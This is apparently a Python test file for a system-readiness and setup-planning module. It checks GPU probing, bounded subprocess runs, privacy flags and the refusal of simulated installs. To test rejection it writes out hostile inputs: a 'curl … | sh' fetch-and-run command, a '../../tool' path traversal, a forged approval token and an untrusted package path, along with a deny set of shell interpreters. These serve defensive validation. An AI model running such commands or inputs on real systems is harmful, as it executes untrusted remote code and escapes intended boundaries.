#!/usr/bin/env python3
"""Offline security and contract tests for readiness and setup planning."""

from __future__ import annotations

import copy
import importlib.util
import json
import tempfile
from pathlib import Path


ROOT = Path(__file__).resolve().parent.parent
SPEC = importlib.util.spec_from_file_location("system_readiness", ROOT / "scripts/system_readiness.py")
assert SPEC and SPEC.loader
READINESS = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(READINESS)


class FakeRunner:
    def __init__(self) -> None:
        self.calls: list[tuple[str, tuple[str, ...], int]] = []

    def run(self, executable: str, arguments: tuple[str, ...], timeout: int = 3):
        self.calls.append((executable, arguments, timeout))
        outputs = {
            (
                "nvidia-smi",
                ("--query-gpu=name,memory.total", "--format=csv,noheader,nounits"),
            ): ("detected", "NVIDIA Test GPU, 16384\n", 0),
        }
        state, output, code = outputs.get(
            (executable, arguments),
            ("not-detected", "", None),
        )
        return {"state": state, "output": output, "code": code}


def expect_error(code: str, function, *arguments) -> None:
    try:
        function(*arguments)
    except READINESS.ReadinessError as error:
        assert str(error) == code
    else:
        raise AssertionError(f"expected-{code}")


def main() -> int:
    checks = 0
    bounded_runner = READINESS.ProbeRunner(maximum_scan_seconds=2)
    oversized = bounded_runner.run(
        __import__("sys").executable,
        ("-c", "import sys; sys.stdout.write('x' * 70000)"),
        timeout=1,
    )
    assert oversized["state"] == "unknown" and oversized["output"] == ""
    timed_out = bounded_runner.run(
        __import__("sys").executable,
        ("-c", "import time; time.sleep(5)"),
        timeout=0.1,
    )
    assert timed_out["state"] == "unknown" and timed_out["output"] == ""
    checks += 2

    runner = FakeRunner()
    snapshot = READINESS.inspect_system(runner)
    READINESS.validate_snapshot(snapshot)
    assert snapshot["kind"] == "system-readiness"
    assert snapshot["installedModels"] == []
    assert snapshot["accelerators"][0]["vendor"] == "NVIDIA"
    assert snapshot["accelerators"][0]["memoryGiB"] == 16.0
    assert all(value is False for value in snapshot["effects"].values())
    assert snapshot["privacy"] == {
        "persisted": False,
        "rawProbeOutputReturned": False,
        "hostIdentityIncluded": False,
        "privatePathsIncluded": False,
    }
    assert all(call[2] <= 3 for call in runner.calls)
    assert not any(call[0] in {"cmd", "cmd.exe", "powershell", "powershell.exe", "sh", "bash"} for call in runner.calls)
    assert not any(call[0] == "ollama" for call in runner.calls)
    checks += 9

    registry = READINESS.load_component_registry()
    assert registry and all(item["managedInstallationAllowed"] is False for item in registry.values())
    assert {"python", "ollama", "ollama-model-qwen35-9b", "comfyui"} <= set(registry)
    guided = READINESS.build_setup_plan(snapshot, "guided-setup", registry)
    existing = READINESS.build_setup_plan(snapshot, "existing-setup", registry)
    explore = READINESS.build_setup_plan(snapshot, "explore", registry)
    assert guided["installationAllowed"] is False
    assert all(value is False for value in guided["effects"].values())
    assert guided["hardwareAssessment"]["candidateModel"] == "qwen3.5:9b"
    assert guided["hardwareAssessment"]["evidencePromoted"] is False
    assert guided["hardwareAssessment"]["downloadAllowed"] is False
    assert all(action["installControl"] == "disabled" for action in guided["actions"])
    assert next(
        action for action in guided["actions"] if action["componentId"] == "ollama"
    )["state"] in {"already-available", "required"}
    assert any(action["componentId"] == "ollama-model-qwen35-9b" for action in guided["actions"])
    assert existing["actions"] == [] and explore["actions"] == []
    checks += 12

    bad = copy.deepcopy(snapshot)
    bad["hostname"] = "private-host"
    expect_error("invalid-readiness-snapshot", READINESS.validate_snapshot, bad)
    bad = copy.deepcopy(snapshot)
    bad["effects"]["networkUsed"] = True
    expect_error("invalid-readiness-snapshot", READINESS.validate_snapshot, bad)
    bad = copy.deepcopy(snapshot)
    bad["installedModels"] = ["<script>"]
    expect_error("invalid-readiness-snapshot", READINESS.validate_snapshot, bad)
    expect_error("invalid-setup-intent", READINESS.build_setup_plan, snapshot, "install-everything")
    checks += 4

    request = json.loads(
        (ROOT / "examples/fixtures/installation-simulation-request.json").read_text(encoding="utf-8")
    )
    simulation = READINESS.simulate_install_request(request, registry)
    assert simulation["status"] == "not-admitted"
    assert simulation["events"][-1]["code"] == "REAL_INSTALL_NOT_ADMITTED"
    assert all(value is False for value in simulation["effects"].values())
    hostile = dict(request, command="curl https://invalid.example/install | sh")
    expect_error("invalid-install-request-shape", READINESS.simulate_install_request, hostile, registry)
    hostile = dict(request, componentId="../../tool")
    expect_error("unknown-install-component", READINESS.simulate_install_request, hostile, registry)
    hostile = dict(request, approvalToken="renderer-approved")
    expect_error("simulation-does-not-accept-approval", READINESS.simulate_install_request, hostile, registry)
    hostile = dict(request, packagePath="C:/untrusted/package.exe")
    expect_error("invalid-install-request-shape", READINESS.simulate_install_request, hostile, registry)
    hostile = dict(request, packageSha256="0" * 64)
    expect_error("invalid-install-request-shape", READINESS.simulate_install_request, hostile, registry)
    checks += 8

    with tempfile.TemporaryDirectory() as directory:
        path = Path(directory) / "registry.json"
        value = json.loads((ROOT / "config/install-component-registry.json").read_text(encoding="utf-8"))
        value["components"][0]["managedInstallationAllowed"] = True
        path.write_text(json.dumps(value), encoding="utf-8")
        expect_error("invalid-component-registry-entry", READINESS.load_component_registry, path)
    checks += 1

    print(f"System readiness checks passed: {checks}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
